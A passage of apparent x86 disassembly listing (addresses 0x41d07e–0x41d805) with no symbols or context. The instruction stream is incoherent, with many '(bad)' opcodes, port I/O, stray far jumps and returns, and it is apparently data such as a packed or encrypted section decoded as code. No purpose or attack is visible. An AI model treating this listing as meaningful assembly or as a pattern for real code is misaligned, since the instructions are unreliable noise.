  41d07e:	loopne 0x41d091
  41d080:	adc    DWORD PTR [eax+0x1a],0xd28b6560
  41d087:	xor    DWORD PTR [esp+eax*1-0x46],ecx
  41d08b:	lock fsubr QWORD PTR [esp+edi*2+0x5b]
  41d090:	popa   
  41d091:	fist   WORD PTR [ebx-0x78]
  41d094:	push   esp
  41d095:	mov    bl,0xdd
  41d097:	mov    eax,0x71986878
  41d09c:	push   ecx
  41d09d:	cmp    BYTE PTR [esi],bh
  41d09f:	ja     0x41d095
  41d0a1:	adc    al,0x42
  41d0a3:	mov    esp,ebp
  41d0a5:	fnsave [edi]
  41d0a7:	fist   WORD PTR [esi+esi*2-0x32]
  41d0ab:	mov    esp,0xbc1f3126
  41d0b0:	fwait
  41d0b1:	mov    edx,0xda80e80f
  41d0b6:	mov    ecx,0x81f4a735
  41d0bb:	xchg   edx,eax
  41d0bc:	fs sbb al,0xef
  41d0bf:	iret   
  41d0c0:	xor    DWORD PTR [ebp-0x19],0xffffff9a
  41d0c4:	and    ebx,DWORD PTR [eax]
  41d0c6:	sub    DWORD PTR [eax+0x77],esi
  41d0c9:	(bad)  
  41d0ca:	outs   dx,DWORD PTR ds:[esi]
  41d0cb:	cmp    ch,BYTE PTR [ebp+0x30]
  41d0ce:	mov    DWORD PTR [ebp-0x6e],eax
  41d0d1:	xor    eax,0xdf79bd99
  41d0d6:	cwde   
  41d0d7:	cld    
  41d0d8:	loopne 0x41d121
  41d0da:	fistp  WORD PTR [ecx-0x7]
  41d0dd:	push   0x1c
  41d0df:	out    dx,al
  41d0e0:	jecxz  0x41d105
  41d0e2:	outs   dx,DWORD PTR ds:[esi]
  41d0e3:	cmp    DWORD PTR [ecx],edi
  41d0e5:	cdq    
  41d0e6:	xchg   edx,eax
  41d0e7:	out    0xc8,al
  41d0e9:	outs   dx,BYTE PTR ds:[esi]
  41d0ea:	push   eax
  41d0eb:	pop    ds
  41d0ec:	jmp    0x41d098
  41d0ee:	(bad)  
  41d0ef:	sub    al,0x9c
  41d0f1:	mov    ds:0x2b41d41b,eax
  41d0f6:	mov    ebx,0x52519eb
  41d0fb:	add    ebx,esi
  41d0fd:	xor    ebp,esp
  41d0ff:	jo     0x41d085
  41d101:	jb     0x41d0c5
  41d103:	jecxz  0x41d133
  41d105:	inc    BYTE PTR [edi+0xac6c7b8]
  41d10b:	mov    edi,DWORD PTR ds:0xd48b75f1
  41d111:	jbe    0xe558118
  41d117:	sub    edx,eax
  41d119:	jg     0x41d148
  41d11b:	lods   al,BYTE PTR ds:[esi]
  41d11c:	push   edx
  41d11d:	mov    eax,0x8118247a
  41d122:	cmc    
  41d123:	into   
  41d124:	ds leave 
  41d126:	dec    ebx
  41d127:	sbb    BYTE PTR ds:0x54627467,bh
  41d12d:	cs lahf 
  41d12f:	icebp  
  41d130:	retf   
  41d131:	jbe    0x41d188
  41d133:	push   es
  41d134:	daa    
  41d135:	mov    edi,0xe9e5b5c
  41d13a:	in     al,0x11
  41d13c:	mov    ebx,0xc7987429
  41d141:	and    dh,BYTE PTR ds:0xfda9a598
  41d147:	jbe    0x41d147
  41d149:	dec    ecx
  41d14a:	scas   eax,DWORD PTR es:[edi]
  41d14b:	cmp    al,0x49
  41d14d:	jnp    0x41d161
  41d14f:	jmp    0x425f995e
  41d154:	fcmovnbe st,st(2)
  41d156:	jnp    0x41d146
  41d158:	inc    ebx
  41d159:	mov    ch,0x2b
  41d15b:	and    al,0x11
  41d15d:	(bad)  
  41d15e:	xor    edi,esp
  41d160:	and    al,0xb6
  41d162:	add    ecx,0xfffffff0
  41d165:	push   ebx
  41d166:	out    dx,al
  41d167:	cdq    
  41d168:	jne    0x41d0f2
  41d16a:	push   0x1f2d8912
  41d16f:	xor    bh,BYTE PTR [edi-0x17]
  41d172:	add    al,0xd1
  41d174:	lahf   
  41d175:	in     eax,dx
  41d176:	add    al,0x86
  41d178:	inc    ebx
  41d179:	mov    cl,0xb1
  41d17b:	push   ss
  41d17c:	or     eax,DWORD PTR [ebx-0x503fbf4a]
  41d182:	jns    0x41d10e
  41d184:	inc    esp
  41d185:	xor    DWORD PTR [ecx+0xb],eax
  41d188:	stos   BYTE PTR es:[edi],al
  41d189:	jb     0x41d1e0
  41d18b:	out    dx,al
  41d18c:	cmc    
  41d18d:	jmp    DWORD PTR [ebp*1-0x2246dfac]
  41d194:	(bad)  
  41d195:	(bad)  
  41d196:	mov    dl,0x41
  41d198:	adc    eax,0x56757878
  41d19d:	mov    DWORD PTR [ebx-0x834fb02],esi
  41d1a3:	push   esi
  41d1a4:	add    eax,0x274a327f
  41d1a9:	fcmovnu st,st(0)
  41d1ac:	pop    edi
  41d1ad:	dec    ebp
  41d1ae:	bound  edi,QWORD PTR [edx+0x59]
  41d1b1:	or     al,0x87
  41d1b3:	mov    cl,0x29
  41d1b5:	xchg   ebx,eax
  41d1b6:	cmp    eax,0xf2dad4c6
  41d1bb:	pop    ds
  41d1bc:	out    dx,eax
  41d1bd:	ret    
  41d1be:	xchg   edx,eax
  41d1bf:	shl    BYTE PTR [ebx],0x50
  41d1c2:	push   ebx
  41d1c3:	pop    esp
  41d1c4:	lds    eax,FWORD PTR [esi+0x78]
  41d1c7:	push   edx
  41d1c8:	mov    eax,0x3406b1ed
  41d1cd:	add    DWORD PTR [ebx],edi
  41d1cf:	pop    edi
  41d1d0:	clc    
  41d1d1:	adc    ah,dh
  41d1d3:	jae    0x41d244
  41d1d5:	cs leave 
  41d1d7:	pop    esi
  41d1d8:	(bad)  [esi+0x48]
  41d1db:	jg     0x41d18c
  41d1dd:	pusha  
  41d1de:	(bad)  
  41d1df:	popa   
  41d1e0:	add    edi,DWORD PTR [eax+edi*4]
  41d1e3:	sbb    cl,dh
  41d1e5:	out    0x1,eax
  41d1e7:	and    ebx,DWORD PTR [eax-0x4ff2e294]
  41d1ed:	add    eax,0x1b55f80b
  41d1f2:	cmp    al,0x28
  41d1f4:	out    0xa8,eax
  41d1f6:	jmp    0xbc77521e
  41d1fb:	xor    BYTE PTR [eax-0x6c614dcb],0x7d
  41d202:	mov    bl,0xc2
  41d204:	ss pop ds
  41d206:	je     0x41d236
  41d208:	mov    WORD PTR [ecx],gs
  41d20a:	out    0x30,eax
  41d20c:	and    al,0xd3
  41d20e:	call   0x7ca1:0x41690c07
  41d215:	push   ebx
  41d216:	fs (bad) 
  41d218:	repz push ecx
  41d21a:	fcom   QWORD PTR [ebx-0x2bc1dc20]
  41d220:	cmp    ch,BYTE PTR [ecx-0x5b]
  41d223:	pop    edi
  41d224:	out    dx,al
  41d225:	sbb    BYTE PTR [esi],cl
  41d227:	and    BYTE PTR [edi],dh
  41d229:	in     al,0x3d
  41d22b:	mov    edx,0xefcff8fa
  41d230:	sbb    BYTE PTR [esi],dh
  41d232:	js     0x41d1b5
  41d234:	xchg   edi,eax
  41d235:	cwde   
  41d236:	dec    edx
  41d237:	repz sbb al,0x24
  41d23a:	mov    ebx,0x71c753ab
  41d23f:	cmp    eax,0x44b5c957
  41d244:	repnz es out dx,eax
  41d247:	pop    ds
  41d248:	push   ebx
  41d249:	mov    esp,0xaf0103ff
  41d24e:	mov    esi,0x424f0565
  41d253:	fcmovnu st,st(5)
  41d255:	xor    ah,0x8
  41d258:	mov    ch,bl
  41d25a:	adc    al,0x3
  41d25c:	std    
  41d25d:	xor    ebp,DWORD PTR [ebp-0x33861a56]
  41d263:	jp     0x41d22c
  41d265:	or     eax,0x7d789b11
  41d26a:	fidivr WORD PTR [eax+0x39]
  41d26d:	jmp    0x8c097d2b
  41d272:	repnz mov ah,0x14
  41d275:	ins    DWORD PTR es:[edi],dx
  41d276:	mov    ch,0xb8
  41d278:	sub    eax,eax
  41d27a:	jne    0x41d24e
  41d27c:	repz mov esi,0xb9c180e2
  41d282:	test   DWORD PTR [ecx],edi
  41d284:	adc    DWORD PTR [ebp+0x74],esp
  41d287:	mov    eax,0x6be838e0
  41d28c:	jns    0x41d2f6
  41d28e:	push   es
  41d28f:	dec    eax
  41d290:	pop    ds
  41d291:	jno    0x41d311
  41d293:	retf   0x11a8
  41d296:	xchg   DWORD PTR [edx+0x15],edi
  41d299:	push   ss
  41d29a:	or     DWORD PTR [edx-0x7a],esp
  41d29d:	xor    DWORD PTR [ebp+0x75],ecx
  41d2a0:	stc    
  41d2a1:	ss iret 
  41d2a3:	pop    ss
  41d2a4:	mov    eax,ds:0xcd98d559
  41d2a9:	xor    ah,BYTE PTR [eax+0x7b]
  41d2ac:	call   0xb95d:0xe5e2fc90
  41d2b3:	scas   eax,DWORD PTR es:[edi]
  41d2b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2b5:	retf   
  41d2b6:	inc    edi
  41d2b7:	adc    eax,0x309a6e09
  41d2bc:	lods   eax,DWORD PTR ds:[esi]
  41d2bd:	in     al,dx
  41d2be:	fldcw  WORD PTR [ecx+0x594ef407]
  41d2c4:	cmp    BYTE PTR [ecx],dh
  41d2c6:	sub    eax,0xd80c2bf9
  41d2cb:	jo     0x41d326
  41d2cd:	cmc    
  41d2ce:	faddp  st(1),st
  41d2d0:	inc    edi
  41d2d1:	adc    eax,0x4f94d4d5
  41d2d6:	mov    bl,BYTE PTR [eax]
  41d2d8:	cs pop eax
  41d2da:	int3   
  41d2db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2dc:	mov    ecx,0xa370feb7
  41d2e1:	dec    esi
  41d2e2:	mov    ecx,0xe552391a
  41d2e7:	mov    bl,0xe3
  41d2e9:	jl     0x41d306
  41d2eb:	xchg   DWORD PTR [edx+0x2782fc5],eax
  41d2f1:	adc    eax,0x4ae0c7e2
  41d2f6:	fsubr  st,st(2)
  41d2f8:	xchg   esi,eax
  41d2f9:	sahf   
  41d2fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2fb:	clc    
  41d2fc:	inc    edi
  41d2fd:	inc    esi
  41d2fe:	ficom  WORD PTR [ebp-0x1e239848]
  41d304:	mov    ah,0x22
  41d306:	mov    ch,BYTE PTR [edx]
  41d308:	ret    
  41d309:	int3   
  41d30a:	in     al,0xa3
  41d30c:	mov    ds:0xc0308bba,al
  41d311:	dec    esi
  41d312:	in     eax,dx
  41d313:	cmp    esp,DWORD PTR [edi]
  41d315:	sbb    eax,0x40704e47
  41d31a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d31b:	sahf   
  41d31c:	push   esi
  41d31d:	pushf  
  41d31e:	pop    edi
  41d31f:	mov    eax,0x198af70d
  41d324:	out    dx,eax
  41d325:	aam    0x32
  41d327:	popf   
  41d328:	das    
  41d329:	mov    dl,0x1f
  41d32b:	pop    ss
  41d32c:	int    0x51
  41d32e:	and    dl,dh
  41d330:	mov    dl,0x10
  41d332:	and    ecx,eax
  41d334:	sti    
  41d335:	pop    ds
  41d336:	stos   BYTE PTR es:[edi],al
  41d337:	mov    edi,0x5bc996fd
  41d33c:	or     dh,ch
  41d33e:	xor    edx,DWORD PTR [ecx-0x63349fd0]
  41d344:	xor    eax,0xf425d66b
  41d349:	add    esp,DWORD PTR [ebx+0x55]
  41d34c:	inc    edi
  41d34d:	test   al,0xbc
  41d34f:	mov    esi,0x2be63cfe
  41d354:	mov    al,0xef
  41d356:	xchg   edi,eax
  41d357:	dec    ebx
  41d358:	dec    ebx
  41d359:	mov    dl,dl
  41d35b:	imul   esi,DWORD PTR [edi-0x34],0xffffff8c
  41d35f:	mov    eax,0xb98efc73
  41d364:	aas    
  41d365:	ror    BYTE PTR [ecx-0x746db733],0xbf
  41d36c:	call   0x61cd59b9
  41d371:	sbb    DWORD PTR [ecx-0x44],edi
  41d374:	mov    dl,0x5c
  41d376:	mov    dh,0xbc
  41d378:	pcmpgtw mm5,QWORD PTR [ecx+0x361f3fcf]
  41d37f:	adc    eax,0xc7a89653
  41d384:	add    eax,0x77a90c11
  41d389:	cmp    ebp,DWORD PTR [ecx+0x75733116]
  41d38f:	and    esi,DWORD PTR [edi-0x285751d2]
  41d395:	push   0x15
  41d397:	jecxz  0x41d319
  41d399:	adc    BYTE PTR ds:0x1f500c23,al
  41d39f:	xchg   edi,eax
  41d3a0:	mov    ?,edi
  41d3a2:	mov    esp,0x53c01e76
  41d3a7:	es push ss
  41d3a9:	shr    BYTE PTR [ebx],cl
  41d3ab:	iret   
  41d3ac:	aas    
  41d3ad:	pop    edx
  41d3ae:	aam    0x69
  41d3b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3b1:	pop    esi
  41d3b2:	push   cs
  41d3b3:	pop    esp
  41d3b4:	xchg   ebp,eax
  41d3b5:	lods   al,BYTE PTR ds:[esi]
  41d3b6:	mov    dh,0x6e
  41d3b8:	in     al,dx
  41d3b9:	fsubr  st,st(2)
  41d3bb:	xchg   esi,eax
  41d3bc:	mov    esi,0xc24308c1
  41d3c1:	ret    
  41d3c2:	pop    ss
  41d3c3:	mov    ch,BYTE PTR [ebp+0x7e59d6c8]
  41d3c9:	aam    0x80
  41d3cb:	xchg   edx,eax
  41d3cc:	gs mov ebp,esp
  41d3cf:	dec    ebx
  41d3d0:	fild   QWORD PTR [ebx-0x21]
  41d3d3:	(bad)  
  41d3d4:	das    
  41d3d5:	jno    0x41d363
  41d3d7:	cwde   
  41d3d8:	pop    eax
  41d3d9:	jmp    0x67efd2a5
  41d3de:	lds    ebx,FWORD PTR [edi+eiz*1+0x67867367]
  41d3e5:	in     eax,0x21
  41d3e7:	in     al,dx
  41d3e8:	cs fxch st(6)
  41d3eb:	stos   DWORD PTR es:[edi],eax
  41d3ec:	mov    ebx,0xac1b3f2f
  41d3f2:	xchg   edi,eax
  41d3f3:	inc    ebx
  41d3f4:	adc    bl,BYTE PTR [edi-0x7d3a967f]
  41d3fa:	push   0xfd313bbc
  41d3ff:	add    eax,0x38135dd8
  41d404:	inc    edi
  41d405:	arpl   WORD PTR [esi-0x1f],di
  41d408:	sub    eax,DWORD PTR [eax+0x5a]
  41d40b:	test   BYTE PTR [ebp-0x15],dh
  41d40e:	pop    esp
  41d40f:	js     0x41d490
  41d411:	jns    0x41d48f
  41d413:	in     al,0xab
  41d415:	jb     0x41d416
  41d417:	mov    al,0x88
  41d419:	xchg   ebp,eax
  41d41a:	mov    dl,0xcf
  41d41c:	lods   eax,DWORD PTR ds:[esi]
  41d41d:	mov    ebx,0x15ba0131
  41d422:	mov    al,ds:0xd52a5892
  41d427:	push   ss
  41d428:	inc    edx
  41d429:	mov    esp,0xc7cd6c02
  41d42e:	sub    al,0x2
  41d430:	xor    dl,ch
  41d432:	xchg   edi,eax
  41d433:	push   bx
  41d435:	sub    ecx,DWORD PTR [edx-0x3f]
  41d438:	jecxz  0x41d3d8
  41d43a:	mov    ch,0xe0
  41d43c:	inc    ecx
  41d43d:	or     ebx,esp
  41d43f:	xor    eax,0x8c1ab4b4
  41d444:	fmul   DWORD PTR [ecx-0x21feec29]
  41d44a:	ss xchg ebx,eax
  41d44c:	push   edx
  41d44d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d44e:	retf   
  41d44f:	adc    eax,0x9d8d99b5
  41d454:	cli    
  41d455:	or     al,0x2e
  41d457:	jl     0x41d45a
  41d459:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d45a:	stos   BYTE PTR es:[edi],al
  41d45b:	cdq    
  41d45c:	push   edx
  41d45d:	loop   0x41d45d
  41d45f:	and    eax,0x124a60f8
  41d464:	bound  eax,QWORD PTR [edx+0x6cf39018]
  41d46a:	push   0x49
  41d46c:	enter  0xbe1a,0x62
  41d470:	pop    ss
  41d471:	lods   al,BYTE PTR ds:[esi]
  41d472:	push   esp
  41d473:	and    BYTE PTR [eax-0x365a2bfb],bl
  41d479:	mov    BYTE PTR [esi+0x484e82ed],cl
  41d47f:	jecxz  0x41d44e
  41d481:	je     0x41d43c
  41d483:	push   esp
  41d484:	sbb    DWORD PTR [ebx+0x3],ecx
  41d487:	mov    DWORD PTR [edi+0x31],edx
  41d48a:	mov    dl,0x23
  41d48c:	inc    edx
  41d48d:	dec    ecx
  41d48e:	add    eax,0x77557d7c
  41d493:	shr    DWORD PTR [eax-0x19],0x7c
  41d497:	call   0x15281b27
  41d49c:	xor    al,0x70
  41d49e:	cmp    edx,DWORD PTR [edx-0x63c99d3b]
  41d4a4:	xchg   edi,eax
  41d4a5:	jo     0x41d427
  41d4a7:	sti    
  41d4a8:	push   ebx
  41d4a9:	out    dx,eax
  41d4aa:	pop    edx
  41d4ab:	lahf   
  41d4ac:	jge    0x41d4cd
  41d4ae:	in     eax,dx
  41d4af:	jbe    0x41d485
  41d4b1:	xchg   edi,eax
  41d4b2:	jge    0x41d510
  41d4b4:	mov    al,ds:0x422cf6c7
  41d4b9:	jecxz  0x41d4bf
  41d4bb:	gs jbe 0x41d4fc
  41d4be:	retf   0xc2f2
  41d4c1:	aaa    
  41d4c2:	push   eax
  41d4c3:	jle    0x41d471
  41d4c5:	lods   eax,DWORD PTR ds:[esi]
  41d4c6:	adc    ch,BYTE PTR [ebp-0x15]
  41d4c9:	sbb    al,BYTE PTR [ebp-0x7e24042b]
  41d4cf:	int3   
  41d4d0:	and    bl,BYTE PTR [edi]
  41d4d2:	push   ebx
  41d4d3:	mov    esi,0x7a7a9472
  41d4d8:	sbb    ebx,DWORD PTR [ebp-0x5a]
  41d4db:	jbe    0x41d528
  41d4dd:	stos   BYTE PTR es:[edi],al
  41d4de:	lea    ebx,[eax-0xdee5000]
  41d4e4:	(bad)  
  41d4e5:	outs   dx,DWORD PTR ds:[esi]
  41d4e6:	adc    esi,DWORD PTR [esi]
  41d4e8:	das    
  41d4e9:	sub    al,0x43
  41d4eb:	xor    cl,BYTE PTR [edi+0x6e2c544c]
  41d4f1:	mov    eax,DWORD PTR [eax-0x39]
  41d4f4:	inc    ecx
  41d4f5:	in     eax,0xf1
  41d4f7:	sahf   
  41d4f8:	repz dec esi
  41d4fa:	pop    ebp
  41d4fb:	lds    ebx,FWORD PTR [edi]
  41d4fd:	dec    eax
  41d4fe:	jge    0x41d52f
  41d500:	push   ss
  41d501:	or     eax,0xdf3a758a
  41d506:	je     0x41d528
  41d508:	mov    ecx,0xe4219660
  41d50d:	push   es
  41d50e:	cmp    al,0xb8
  41d510:	push   edx
  41d511:	xchg   ebp,eax
  41d512:	fld    DWORD PTR [esi-0x5b]
  41d515:	scas   eax,DWORD PTR es:[edi]
  41d516:	or     ch,BYTE PTR [esi+0x139c44a1]
  41d51c:	push   ss
  41d51d:	enter  0x95e4,0x6d
  41d521:	arpl   WORD PTR [esi+0x42bad819],ax
  41d527:	pop    es
  41d528:	inc    edx
  41d529:	data16 mov al,ds:0xc48b904e
  41d52f:	cwde   
  41d530:	cdq    
  41d531:	mov    eax,0x33abdfe
  41d536:	ins    DWORD PTR es:[edi],dx
  41d537:	(bad)  
  41d538:	cmp    cl,ch
  41d53a:	loopne 0x41d4ee
  41d53c:	mov    ds:0x70d535c0,eax
  41d541:	lods   al,BYTE PTR ds:[esi]
  41d542:	pop    ebx
  41d543:	fwait
  41d544:	pusha  
  41d545:	leave  
  41d546:	mov    esp,0x3accc6ff
  41d54b:	sub    al,0xe8
  41d54d:	fneni(8087 only) 
  41d54f:	sub    DWORD PTR [ebp-0x10],0x3e
  41d553:	mov    al,ds:0x9a8134c1
  41d558:	xchg   ecx,eax
  41d559:	nop
  41d55a:	dec    esi
  41d55b:	es mov edx,0x4af53336
  41d561:	repz cld 
  41d563:	push   esi
  41d564:	jmp    0xa56c:0x2ac63b15
  41d56b:	mov    ah,0x68
  41d56d:	mov    eax,ds:0x22ba0e01
  41d572:	(bad)  
  41d573:	in     eax,0x5f
  41d575:	push   esi
  41d576:	mov    al,ds:0x92db0692
  41d57b:	jo     0x41d5d7
  41d57d:	jae    0x41d560
  41d57f:	mov    WORD PTR [edx+0x10],ds
  41d582:	addr16 fadd st(7),st
  41d585:	push   es
  41d586:	sub    ebp,ebp
  41d588:	fwait
  41d589:	xor    BYTE PTR [ebx+0x10558b7b],bh
  41d58f:	xor    bl,BYTE PTR [ebp+edx*4-0x77]
  41d593:	or     ebp,ecx
  41d595:	in     eax,dx
  41d596:	and    al,0x5a
  41d598:	xchg   ebp,eax
  41d599:	nop
  41d59a:	mov    eax,0x414ec957
  41d59f:	xor    bh,0xca
  41d5a2:	mov    cl,0x1e
  41d5a4:	outs   dx,BYTE PTR ds:[esi]
  41d5a5:	push   cs
  41d5a6:	adc    DWORD PTR [edx+0x55],0x7fb3ec69
  41d5ad:	mov    edx,0xd490cb1d
  41d5b2:	scas   al,BYTE PTR es:[edi]
  41d5b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5b4:	adc    DWORD PTR [eax],ecx
  41d5b6:	js     0x41d614
  41d5b8:	push   cs
  41d5b9:	out    dx,eax
  41d5ba:	cmp    DWORD PTR [ebp+ebp*1-0x3d453a0],esi
  41d5c1:	xchg   ecx,eax
  41d5c2:	dec    BYTE PTR fs:[eax]
  41d5c5:	xor    BYTE PTR cs:[ecx-0x35ebc502],ah
  41d5cc:	call   0x819d:0x5d8fb244
  41d5d3:	or     BYTE PTR [esi+0x2059c5e9],0x65
  41d5da:	dec    ecx
  41d5db:	push   cs
  41d5dc:	sbb    edi,DWORD PTR [ebx+edx*2+0x24b5ceb6]
  41d5e3:	adc    ebx,eax
  41d5e5:	imul   ch
  41d5e7:	mov    ebx,0x1649d925
  41d5ec:	test   BYTE PTR [ecx],0x40
  41d5ef:	inc    ebx
  41d5f0:	std    
  41d5f1:	dec    ebp
  41d5f2:	ret    
  41d5f3:	inc    ebx
  41d5f4:	das    
  41d5f5:	dec    edi
  41d5f6:	xchg   ebx,eax
  41d5f7:	test   BYTE PTR [edx+0x5f783cac],0x0
  41d5fe:	ss jo  0x41d5c9
  41d601:	cmp    eax,0x4a1827f4
  41d606:	lea    ebx,[edx-0x53]
  41d609:	add    eax,0x6689e57e
  41d60e:	cmp    DWORD PTR [edi+0x76],esp
  41d611:	mov    ch,BYTE PTR [edi+ecx*4]
  41d614:	int3   
  41d615:	or     esi,DWORD PTR [edx+ebp*1+0x708e6c61]
  41d61c:	not    al
  41d61e:	imul   edi,DWORD PTR [ecx],0xbbb23867
  41d624:	loopne 0x41d5f4
  41d626:	js     0x41d5bb
  41d628:	adc    eax,0xffffffa7
  41d62b:	aam    0xd0
  41d62d:	xchg   esp,eax
  41d62e:	mov    ds:0xfdb7f7bf,eax
  41d633:	pusha  
  41d634:	sub    BYTE PTR [edx+0x3c519958],al
  41d63a:	or     DWORD PTR [eax+0x161eb380],edx
  41d640:	xchg   edx,eax
  41d641:	call   0xa040:0x2910d138
  41d648:	xor    BYTE PTR [edx+0x13226c51],al
  41d64e:	shl    BYTE PTR [ebx+edx*2],1
  41d651:	jno    0x41d620
  41d653:	sub    ebx,DWORD PTR [ebp-0x22]
  41d656:	mov    bh,0x6d
  41d658:	xor    dl,BYTE PTR [eax-0x1ff8c7f1]
  41d65e:	daa    
  41d65f:	out    dx,al
  41d660:	inc    esp
  41d661:	adc    eax,0x5bf47ad0
  41d666:	mov    al,0xcc
  41d668:	pop    edi
  41d669:	mov    bh,0x39
  41d66b:	ds (bad) 
  41d66d:	leave  
  41d66e:	hlt    
  41d66f:	push   esi
  41d670:	cmp    ebx,edx
  41d672:	out    0xb8,eax
  41d674:	and    DWORD PTR [ecx+0x2b],edi
  41d677:	rcr    DWORD PTR [esi+0x9e81a7e],0xd6
  41d67e:	xchg   esp,eax
  41d67f:	dec    eax
  41d680:	(bad)
  41d684:	jbe    0x41d6f4
  41d686:	(bad)  
  41d687:	jb     0x41d618
  41d689:	scas   al,BYTE PTR es:[edi]
  41d68a:	sbb    ah,BYTE PTR [ecx]
  41d68c:	add    esi,DWORD PTR [edi+0x7a3bd33]
  41d692:	mov    ds:0x9eab55de,eax
  41d697:	sub    esp,DWORD PTR [eax]
  41d699:	pop    ebx
  41d69a:	test   al,0x60
  41d69c:	cmc    
  41d69d:	hlt    
  41d69e:	sbb    eax,0x705605be
  41d6a3:	xchg   edi,eax
  41d6a4:	and    DWORD PTR ds:0xf8f4ee58,ebp
  41d6aa:	and    BYTE PTR [eax],0x33
  41d6ad:	jmp    0xedfc:0xa7e54b1e
  41d6b4:	jne    0x41d64a
  41d6b6:	adc    dh,cl
  41d6b8:	jnp    0x41d72d
  41d6ba:	stc    
  41d6bb:	sub    cl,0x9e
  41d6be:	mov    edi,0xe2ef9bae
  41d6c3:	mov    ah,0x7c
  41d6c5:	lahf   
  41d6c6:	push   edi
  41d6c7:	mov    cl,BYTE PTR [ecx]
  41d6c9:	sar    DWORD PTR [eax-0x6837bc41],1
  41d6cf:	cmp    DWORD PTR [ebx+0x70dacbfb],ebx
  41d6d5:	and    BYTE PTR [esp+edi*4-0x61],0x6a
  41d6da:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41d6dc:	(bad)  
  41d6dd:	cmp    al,0xcc
  41d6df:	fld    TBYTE PTR [esi+0x5c]
  41d6e2:	mov    esp,0xbda0f6b3
  41d6e7:	sar    DWORD PTR [edx-0x2d],1
  41d6ea:	dec    ebp
  41d6eb:	stc    
  41d6ec:	adc    BYTE PTR [edx+0x39],dh
  41d6ef:	lahf   
  41d6f0:	popa   
  41d6f1:	lods   eax,DWORD PTR ds:[si]
  41d6f3:	maxps  xmm5,XMMWORD PTR [eax]
  41d6f6:	out    0xa6,eax
  41d6f8:	jp     0x41d729
  41d6fa:	lods   al,BYTE PTR ds:[esi]
  41d6fb:	inc    ebx
  41d6fc:	push   eax
  41d6fd:	out    0x6b,al
  41d6ff:	jne    0x41d6ec
  41d701:	push   ecx
  41d702:	ret    
  41d703:	inc    ecx
  41d704:	mov    esp,0xf246960d
  41d709:	test   BYTE PTR [edx+ebp*8],ah
  41d70c:	inc    edx
  41d70d:	mov    ecx,DWORD PTR [ecx+eax*4]
  41d710:	aas    
  41d711:	lds    edi,FWORD PTR ds:[ecx]
  41d714:	out    0x49,al
  41d716:	js     0x41d721
  41d718:	ficomp WORD PTR [edi+0x42d85914]
  41d71e:	adc    al,0x2e
  41d720:	cmc    
  41d721:	shl    DWORD PTR [edx],cl
  41d723:	nop
  41d724:	xor    DWORD PTR [ebx+eax*8],edi
  41d727:	cmp    BYTE PTR [eax],bh
  41d729:	mov    bh,0x80
  41d72b:	xchg   edx,eax
  41d72c:	rol    BYTE PTR [eax+ecx*1-0x64],1
  41d730:	(bad)  
  41d731:	mov    ds:0x2f6be425,al
  41d736:	xor    eax,0x20768283
  41d73b:	sbb    BYTE PTR [esi-0x6c],ch
  41d73e:	pop    ss
  41d73f:	sub    eax,0x438c507c
  41d744:	push   0x4d5634e9
  41d749:	js     0x41d745
  41d74b:	xor    esp,DWORD PTR [edx+0x36c80b4]
  41d751:	stos   DWORD PTR es:[edi],eax
  41d752:	pop    es
  41d753:	fcom   DWORD PTR [ebp+0x67]
  41d756:	and    BYTE PTR ds:0xb2c6ae6d,dl
  41d75c:	aas    
  41d75d:	or     DWORD PTR [ebx],edi
  41d75f:	sub    eax,0x8ba45fed
  41d764:	adc    bh,BYTE PTR [edx]
  41d766:	jge    0x41d744
  41d768:	std    
  41d769:	(bad)  
  41d76a:	cli    
  41d76b:	xchg   ebx,eax
  41d76c:	les    ebx,FWORD PTR [edx-0x34f91e0e]
  41d772:	scas   eax,DWORD PTR es:[edi]
  41d773:	es xor ah,cl
  41d776:	mov    cl,0xad
  41d778:	cwde   
  41d779:	jge    0x41d784
  41d77b:	jbe    0x41d76c
  41d77d:	retf   0x76d1
  41d780:	xchg   BYTE PTR [esp+edx*2],al
  41d783:	dec    edi
  41d784:	inc    esi
  41d785:	push   es
  41d786:	in     al,0x94
  41d788:	xchg   esi,eax
  41d789:	nop
  41d78a:	cmp    eax,DWORD PTR [ecx]
  41d78c:	mov    ch,0xfb
  41d78e:	leave  
  41d78f:	jmp    0xce89:0xac27af36
  41d796:	add    al,0xb
  41d798:	loopne 0x41d80a
  41d79a:	fdiv   DWORD PTR [esi]
  41d79c:	fwait
  41d79d:	mov    eax,0x8bff9e31
  41d7a2:	push   ss
  41d7a3:	pop    ecx
  41d7a4:	nop
  41d7a5:	loopne 0x41d814
  41d7a7:	add    dl,cl
  41d7a9:	mov    al,0xab
  41d7ab:	mov    esp,0xfc4fbac1
  41d7b0:	add    BYTE PTR [ebx-0x72177f89],dl
  41d7b6:	aam    0x6a
  41d7b8:	inc    eax
  41d7b9:	pusha  
  41d7ba:	or     edx,0x706b7597
  41d7c0:	arpl   WORD PTR [ecx-0x1a],bx
  41d7c3:	xlat   BYTE PTR ds:[ebx]
  41d7c4:	loop   0x41d765
  41d7c6:	add    esp,DWORD PTR [ecx-0x90b1791]
  41d7cc:	mov    esi,0x8fd3156e
  41d7d1:	outs   dx,DWORD PTR ds:[esi]
  41d7d2:	fbstp  TBYTE PTR [eax+ebp*1+0x11]
  41d7d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7d7:	and    eax,0xeb2410b6
  41d7dc:	das    
  41d7dd:	xor    esi,DWORD PTR [ebx]
  41d7df:	pop    edx
  41d7e0:	ficom  WORD PTR [esi-0x68893224]
  41d7e6:	sbb    BYTE PTR [esi+0x56f20612],0x2e
  41d7ed:	std    
  41d7ee:	jno    0x41d85b
  41d7f0:	push   esi
  41d7f1:	das    
  41d7f2:	push   esp
  41d7f3:	xchg   esi,eax
  41d7f4:	(bad)  
  41d7f5:	aas    
  41d7f6:	push   cs
  41d7f7:	jg     0x41d805
  41d7f9:	vsubpd xmm5,xmm5,XMMWORD PTR [edx*8-0x7bfba24d]
  41d802:	mov    eax,ecx
  41d804:	into   
  41d805:	les    ebp,FWORD PTR [ebx+ecx*1-0x210ab24e]
